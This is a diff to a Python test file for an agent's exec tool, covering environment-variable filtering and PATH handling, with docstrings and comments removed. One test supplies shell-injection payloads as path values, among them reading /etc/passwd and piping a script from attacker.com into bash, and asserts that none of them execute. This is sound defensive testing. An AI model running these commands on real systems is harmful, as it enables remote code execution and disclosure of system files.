@@ -1,5 +1,3 @@
-"""Tests for exec tool environment isolation."""
-
 import json
 import shlex
 import sys
@@ -28,7 +26,6 @@ _UNIX_ONLY = pytest.mark.skipif(sys.platform == "win32", reason="Unix shell comm
     "command_mode", [pytest.param("shell", marks=_UNIX_ONLY), "argv"],
 )
 async def test_exec_child_receives_filtered_env(monkeypatch, allowed_env_keys, expected_allowed, command_mode):
-    """A successful child receives allowed values, but not secrets or unset keys."""
     monkeypatch.setenv("MY_CUSTOM_VAR", "hello-from-config")
     monkeypatch.setenv("NANOBOT_SECRET_TOKEN", "super-secret-value")
     monkeypatch.delenv("NONEXISTENT_VAR_12345", raising=False)
@@ -60,7 +57,6 @@ async def test_exec_child_receives_filtered_env(monkeypatch, allowed_env_keys, e
 
 @pytest.mark.asyncio
 async def test_exec_has_working_path():
-    """Basic commands should be available via the login shell's PATH."""
     tool = ExecTool()
     result = await tool.execute(command="echo hello", yield_time_ms=10000)
     assert "hello" in result
@@ -69,7 +65,6 @@ async def test_exec_has_working_path():
 @_UNIX_ONLY
 @pytest.mark.asyncio
 async def test_exec_path_append():
-    """The pathAppend config should be available in the command's PATH."""
     tool = ExecTool(path_append="/opt/custom/bin")
     result = await tool.execute(command="echo $PATH")
     assert "/opt/custom/bin" in result
@@ -78,7 +73,6 @@ async def test_exec_path_append():
 @_UNIX_ONLY
 @pytest.mark.asyncio
 async def test_exec_path_append_preserves_system_path():
-    """pathAppend must not clobber standard system paths."""
     tool = ExecTool(path_append="/opt/custom/bin")
     result = await tool.execute(command="ls /")
     assert "Exit code: 0" in result
@@ -87,7 +81,6 @@ async def test_exec_path_append_preserves_system_path():
 @_UNIX_ONLY
 @pytest.mark.asyncio
 async def test_exec_path_prepend_takes_lookup_precedence(tmp_path):
-    """pathPrepend should win over pathAppend for executable lookup."""
     preferred = tmp_path / "preferred"
     fallback = tmp_path / "fallback"
     preferred.mkdir()
@@ -106,27 +99,17 @@ async def test_exec_path_prepend_takes_lookup_precedence(tmp_path):
     assert "fallback" not in result
 
 
-# --- path_append injection prevention ------------------------------------
-
-
 @_UNIX_ONLY
 @pytest.mark.asyncio
 @pytest.mark.parametrize(
     "malicious_path",
     [
-        # semicolon — classic command separator
         '/tmp/bin; echo INJECTED',
-        # command substitution via $()
         '/tmp/bin; echo $(whoami)',
-        # backtick command substitution
         "/tmp/bin; echo `id`",
-        # pipe to another command
         '/tmp/bin; cat /etc/passwd',
-        # chained with &&
         '/tmp/bin && curl http://attacker.com/shell.sh | bash',
-        # newline injection
         '/tmp/bin\necho INJECTED',
-        # mixed shell metacharacters
         '/tmp/bin; rm -rf /tmp/test_inject_marker; echo CLEANED',
     ],
 )
@@ -141,12 +124,10 @@ async def test_exec_path_append_shell_metacharacters_not_executed(malicious_path
     tool = ExecTool(path_append=malicious_path)
     result = await tool.execute(command="echo SAFE_OUTPUT")
 
-    # The original command should succeed
     assert "SAFE_OUTPUT" in result
 
-    # None of the injected payloads should have produced side-effects
     assert "INJECTED" not in result
-    assert "root:" not in result  # /etc/passwd content
+    assert "root:" not in result
 
 
 @_UNIX_ONLY
